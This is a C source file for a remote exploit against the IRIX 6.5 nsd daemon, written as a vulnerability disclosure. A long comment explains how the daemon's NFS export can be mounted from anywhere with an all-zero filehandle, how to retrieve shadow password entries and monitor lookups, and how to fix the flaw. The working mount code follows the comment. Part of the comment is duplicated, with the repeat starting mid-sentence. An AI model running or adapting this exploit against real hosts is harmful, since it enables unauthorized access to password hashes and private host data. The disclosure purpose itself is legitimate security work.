

/******************************************************************************

IRIX 6.5 nsd virtual filesystem exploit

Author: Jefferson Ogata (JO317) <ogata@pobox.com>

Please note that this program comes with NO WARRANTY WHATSOEVER. Your use
of this program constitutes your complete acceptance of all liability for
any damage or loss caused by the aforesaid use. It is provided to the
network community solely to document the existence of a vulnerability
in the security implementations of certain versions of IRIX, and may not
be used for any illicit purpose. Many of the details of the bug this
program exploits have been available to users of SGI's online support
system since February 1999. The current revision of IRIX (6.5.3) corrects
this bug, at least enough to stop this particular exploit, and I strongly
encourage you to bring your systems up to date as quickly as possible.

With IRIX 6.5, SGI has moved all name services, NIS services, and DNS
lookups into a userland process called nsd, which exports the results of
the queries it fields into a virtual filesystem. The virtual filesystem is
normally mounted onto the directory /ns by the program /sbin/nsmount, which
is invoked by nsd on startup. The nsd daemon itself is exporting the
filesystem via NFS3 over a dynamically bound UDP port -- rather than a
well-known or settable one -- typically in the 1024-1029 range. On a
desktop system, 1024 is a good bet, since nsd is usually the first
RPC/UDP service to be started.

The NFS filesystem is not registered with mountd, so there is no way to
query mountd for a mount filehandle. But because the NFS port is fairly
easy to discover through port scanning, and because the mount filehandle
nsd uses is simply a string of 32 zeroes, it is trivial to mount the nsd
filesystem from a host anywhere on the Internet. nsd will serve an array
of NFS requests to anyone. Furthermore, because the service's NFS port is
bound dynamically, it is difficult to protect it with a firewall; it may
change from one system start to another, or if the daemon is killed and
restarted.

This program can successfully mount the nsd-exported virtual filesystem
from a remote host onto a machine running IRIX 6.4 or higher. It makes use
of the MS_DOXATTR mount flag defined in IRIX 6.4 and higher. I do not know
what this flag does at the NFS protocol level, but it allows the client to
ask the NFS server not to enforce certain permissions controls against the
client. I don't know whether any other vendor NFS client systems support
this flag. A clever person might write a userland NFS client that would
accept an initial handle, NFS port, etc. as arguments.

On an SGI with SGI C compiler, compile with:

    cc -o nsdadv nsdadv.c

Run it this way:

    nsdadv /mnt sucker.example.com 1024

with obvious substitutions.

So what are the security implications of this? Well, at the very least, the
nsd filesystem on an NIS server reveals the NIS domain name, and what maps
it contains, as well as what classes are being used.

By exploring the filesystem shortly after it has been mounted I have been
able to retrieve data that should be hidden from me, including shadow
password entries from a remote system's shadow file.

Beyond retrieving keys and maps, you can also monitor the filesystem for
changes. A great deal of information is leaked through the contents of the
nsd filesystem. For example, if host A looks up a host B's IP address, a
file named B will appear in the /.local/hosts.byname directory in A's nsd
filesystem. The file's contents will be the IP address.

By the way, though you be unable to chdir into a particular location in
the nsd filesystem, you may yet succeed under slightly different
conditions. Eventually you can do it. I'm not sure why or when, but nsd
gets picky sometimes. Eventually it relents. Specifically, I've found that
the entire nsd filesystem appears readable for a few seconds after it is
initially mounted. If you can't look at something, unmount the filesystem,
remount it, and try again immediately. It also seems that a stat() is
sometimes required before a chdir(). Your mileage may vary, but keep
trying. You may wish to write a script to mount the nsd filesystem, explore
and take inventory of its contents, and unmount the filesystem quickly.

Once you've chdir'd into a directory, it appears you can always read it,
although you can't necessarily stat its contents. This suggests a strategy
of spawning a group of processes each with its cwd set to a subdirectory of
the nsd filesystem, in order to retain visibility on the entire filesystem.
Each process would generate an inventory of its cwd, and then monitor it
for changes. A Perl script could do this well.

Another thing: it is possible to create an empty file in nsd's exported
filesystem simply by stat()ing a nonexistent filename. This suggests a
potential DoS by creating many files in a directory.

Remember that the system keeps a local cache in /var/ns, so you may have
to wait for cached entries on the target host to expire before you'll see
them reappear in the virtual filesystem.

For some fairly extensive info on the nsd implementation, take a look at:

    http://www.bitmover.com/lm/lamed_arch.html

******

What got me into all this was that I found I could no longer run services
chrooted if they required DNS. It took considerable effort to come up with
a solution to this. This was a fundamental change from IRIX 6.4, and I know
I'm not the only one who finds the nsd implementation to be a generally
unpleasant direction, in part because it causes umount -t nfs to break
system database services. I give SGI points for creativity -- in one sense,
using NFS as a database access system is a very slick approach. But the
database needs a security model, and the model needs to be implemented
correctly. Neither of these needs appears to have been met.

So how could SGI fix this?

Without going back, SGI could at least make nsd respond only to queries
from localhost (see note below about IRIX 6.5.3). The problem here is that
they actually intend to support remote mounts in later releases, in order
to supplement or supplant other means of distribution. The web documents
indicate this.

They could create a well-randomized mount filehandle for the filesystem
and pass that to nsmount. Then you couldn't remotely mount the filesystem
without guessing the handle -- nontrivial with a 32-byte handle.

At the very least, they should provide libraries of regular BIND resolver
routines, file-based getpwent, etc. routines, so one could choose the
resolution strategy at link time, perhaps by modifying the shared library
path.

******

With IRIX release 6.5.3, SGI appears to have fixed this problem, at least
to some degree. The exploit does not appear to work as it does against
6.5.2. Further testing is needed, and the behavior should be watched
carefully in future versions of IRIX.

suggests a
potential DoS by creating many files in a directory.

Remember that the system keeps a local cache in /var/ns, so you may have
to wait for cached entries on the target host to expire before you'll see
them reappear in the virtual filesystem.

For some fairly extensive info on the nsd implementation, take a look at:

    http://www.bitmover.com/lm/lamed_arch.html

******

What got me into all this was that I found I could no longer run services
chrooted if they required DNS. It took considerable effort to come up with
a solution to this. This was a fundamental change from IRIX 6.4, and I know
I'm not the only one who finds the nsd implementation to be a generally
unpleasant direction, in part because it causes umount -t nfs to break
system database services. I give SGI points for creativity -- in one sense,
using NFS as a database access system is a very slick approach. But the
database needs a security model, and the model needs to be implemented
correctly. Neither of these needs appears to have been met.

So how could SGI fix this?

Without going back, SGI could at least make nsd respond only to queries
from localhost (see note below about IRIX 6.5.3). The problem here is that
they actually intend to support remote mounts in later releases, in order
to supplement or supplant other means of distribution. The web documents
indicate this.

They could create a well-randomized mount filehandle for the filesystem
and pass that to nsmount. Then you couldn't remotely mount the filesystem
without guessing the handle -- nontrivial with a 32-byte handle.

At the very least, they should provide libraries of regular BIND resolver
routines, file-based getpwent, etc. routines, so one could choose the
resolution strategy at link time, perhaps by modifying the shared library
path.

******

With IRIX release 6.5.3, SGI appears to have fixed this problem, at least
to some degree. The exploit does not appear to work as it does against
6.5.2. Further testing is needed, and the behavior should be watched
carefully in future versions of IRIX.

******************************************************************************/



#include <stdio.h>
#include <string.h>
#include <malloc.h>
#include <mntent.h>
#include <sys/types.h>
#include <rpc/types.h>
#include <sys/fstyp.h>
#include <sys/fsid.h>
#include <sys/mount.h>
#include <sys/fs/nfs.h>
#include <sys/fs/nfs_clnt.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>

/* Filesystem type name for nsd-exported filesystem. */
#define NSD_FSTYPE      "nfs3"

/* File the records mounted filesystems. */
#define MTAB_FILE       "/etc/mtab"

/* Socket address we'll fill in with our destination IP and port. */
struct sockaddr_in sin;

/* All zero file handle. This appears to be the base handle for the nsd
   filesystem. Great security, huh? */
unsigned char fh[NFS_FHSIZE] = { 0 };

/* NFS mount options structure to pass to mount(2). The meanings of these
   are documented to some extent in /usr/include/sys/fs/nfs_clnt.h. The
   flags field indicates that this is a soft mount without log messages,
   and to set the initial timeout and number of retries from fields in
   this structure. The fh field is a pointer to the filehandle of the
   mount point, whose size is set by fh_len. As noted above, the mount
   point filehandle is just 32 zeroes. */
struct nfs_args nx =
{
    &sin,               /* addr */
    (fhandle_t *) fh,   /* fh */
    NFSMNT_SOFT|NFSMNT_TIMEO|NFSMNT_RETRANS|NFSMNT_NOAC,        /* flags */
    0,                  /* wsize */
    0,                  /* rsize */
    100,                /* timeo */
    2,                  /* retrans */
    0,                  /* hostname */
    0,                  /* acregmin */
    0,                  /* acregmax */
    0,                  /* acdirmin */
    0,                  /* acdirmax */
    0,                  /* symttl */

    { 0 },              /* base */

    0,                  /* namemax */
    NFS_FHSIZE,         /* fh_len */
    /* On IRIX 6.4 and up there are also the following... */
                        /* bdsauto */
                        /* bdswindow */
    /* On IRIX 6.5 there are also the following... */
                        /* bdsbuflen */
                        /* pid */
                        /* maxthreads */
};

void usage (void)
{
    fprintf (stderr, "usage: nsmount_remote directory host port\n\n");
    fprintf (stderr, "NFS-mounts the virtual filesystem exported by nsd on <host> via NSD daemon\n");
    fprintf (stderr, "port <port> onto <directory>.\n\n");
    exit (1);
}

int main (int argc, char **argv)
{
    char                *dir;
    char                *host;
    char                *ports;
    int                 port;
    struct hostent      *h;
    int                 fstype;
    FILE                *mtabf;
    struct mntent       mnt =
    {
        0,
        0,
        NSD_FSTYPE,
        "soft,timeo=100,retrans=2",
        0,
        0,
    };

    if (argc != 4)
        usage ();

    dir = argv[1];
    host = argv[2];
    port = atoi ((ports = argv[3]));

    /* Prepare for host lookup. */
    memset ((void *) &sin, 0, sizeof (sin));
    sin.sin_family = 2;
    sin.sin_port = port;

    /* Look up the host. */
    if (inet_aton (host, &sin.sin_addr))
        ;
    else if ((h = gethostbyname (host)))
    {
        unsigned long   *l = (unsigned long *) *(h->h_addr_list);
        sin.sin_addr.s_addr = l[0];
    }
    else
    {
        fprintf (stderr, "Cannot resolve host %s.\n", host);
        return 1;
    }

    /* Get filesystem type index for nsd filesystem type. */
    if ((fstype = sysfs (GETFSIND, NSD_FSTYPE)) < 0)
    {
        perror ("sysfs (" NSD_FSTYPE ")");
        return 1;
    }

    fprintf (stderr, "Mounting nsd " NSD_FSTYPE " fs from %s(%s):%d onto %s\n",
        host, inet_ntoa (sin.sin_addr), port, dir);

    /* These flags are documented in /usr/include/sys/mount.h. MS_DOXATTR
       means "tell server to trust us with attributes" and MS_DATA means
       "6-argument mount".

       MS_DOXATTR is a mount option in IRIX 6.4 and up. The attack doesn't
       seem to work without this option. So even though this program will
       compile on IRIX 6.2, you need to use an IRIX 6.4 or higher OS to
       attack nsd. */
    if (mount (dir, dir, MS_DOXATTR|MS_DATA, (char *) fstype, &nx, sizeof (nx))
        != 0)
    {
        perror ("mount");
        return 1;
    }

    /* Record mount point in /etc/mtab. */
    mnt.mnt_fsname = malloc (strlen (host) + sizeof (":nsd@") + strlen (ports) + 1);
    sprintf (mnt.mnt_fsname, "%s:nsd@%s", host, ports);
    mnt.mnt_dir = dir;
    if (!(mtabf = setmntent (MTAB_FILE, "r+")))
    {
        perror ("setmntent");
        return 1;
    }
    if (addmntent (mtabf, &mnt) < 0)
    {
        perror ("addmntent");
        return 1;
    }
    if (endmntent (mtabf) < 0)
    {
        perror ("endmntent");
        return 1;
    }

    return 0;
}
